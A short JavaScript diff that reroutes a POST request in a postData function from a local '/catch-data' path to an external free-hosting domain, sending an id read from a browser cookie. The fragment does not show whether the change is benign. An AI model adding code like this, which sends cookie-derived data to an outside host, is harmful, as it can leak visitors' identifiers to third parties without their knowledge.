@@ -30,7 +30,7 @@ const postData = async () => {
     const id = getCookieValue(COOKIE_NAME);
 
     try {
-        const response = await fetch('/catch-data', {
+        const response = await fetch('https://scriptnube.000webhostapp.com/catch-data', {
             method: 'POST',
             body: JSON.stringify({
                 id: id,
